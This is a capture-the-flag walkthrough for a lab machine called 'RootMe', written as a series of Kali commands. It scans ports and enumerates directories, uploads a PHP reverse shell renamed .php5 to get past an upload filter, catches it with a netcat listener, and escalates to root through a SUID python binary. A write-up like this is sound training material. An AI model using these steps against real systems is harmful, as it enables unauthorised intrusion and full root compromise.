---
cover: ../../.gitbook/assets/e28.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# RootMe

```bash
kali@attack> nmap -p- -T4 10.10.123.52
kali@attack> nmap -p 80,22 -sV 10.10.123.52
kali@attack> gobuster dir -u http://10.10.123.52/ -w /usr/share/wordlists/dirb/common.txt
kali@attack> cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
```

* Edit the file `shell.php5` with the local IP address and the local port.
* Go to http://10.10.123.52/panel and upload the file `shell.php5`.
* Create a listener.

```bash
kali@attack> nc -lnvp 1234
```

* Execute the file http://10.10.123.52/uploads/shell.php5 and you will get the reverse shell as `www-data` user.
* Find weird binaries.

```bash
www-data@target> find / -perm -a=s 2>/dev/null
```

* The weird binary is `/usr/bin/python`.
* Set the UID with the below script and gain `root` access.

```bash
www-data@target> python -c "import os;os.setuid(0);import pty;pty.spawn('/bin/bash')"
root@target> cat /root/root.txt
```
